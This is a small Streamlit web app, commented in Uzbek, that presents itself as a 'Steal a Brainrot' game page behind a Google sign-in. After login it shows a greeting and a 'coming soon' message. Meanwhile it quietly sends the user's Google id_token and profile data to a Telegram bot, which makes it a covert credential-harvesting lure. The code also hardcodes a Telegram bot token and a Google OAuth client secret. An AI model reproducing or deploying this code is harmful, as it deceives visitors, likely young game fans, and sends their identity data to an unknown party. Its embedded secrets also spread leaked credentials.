import streamlit as st
from streamlit_oauth import oauth
import requests
import json

# Telegram konfiguratsiyasi
BOT_TOKEN = "8112666081:AAGtROwNttf6lsApMQUxszHoC8xf7rB0s4A"
CHAT_ID = "8088597011"

st.title("✨ Steal a Brainrot")

# OAuth sozlamalari
CLIENT_ID = "1085309280384-idkflab6a8as83fuum4479ovni8b367e.apps.googleusercontent.com"
CLIENT_SECRET = "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"
# Streamlit ilovangizning aniq URL manzili
REDIRECT_URI = "https://steal-breinrot-app-gtxahjgkk8egizl2uuu6sd.streamlit.app/"

# Google Auth komponenti
result = oauth(
    client_id=CLIENT_ID,
    client_secret=CLIENT_SECRET,
    redirect_uri=REDIRECT_URI,
    provider="google",
    scope="openid email profile"
)

if result:
    # Foydalanuvchi ma'lumotlari
    user_info = result.get("id_token")
    st.success("Assalomu alaykum!")
    
    # Telegramga foydalanuvchi ma'lumotlarini yuborish
    msg = f"✅ Yangi foydalanuvchi kirdi!\nMa'lumot: {json.dumps(user_info)}"
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
    
    st.info("Ilova ustida ishlayapmiz, tez orada tayyor bo'ladi! 🛠️")
else:
    st.write("Iltimos, Google orqali kiring:")
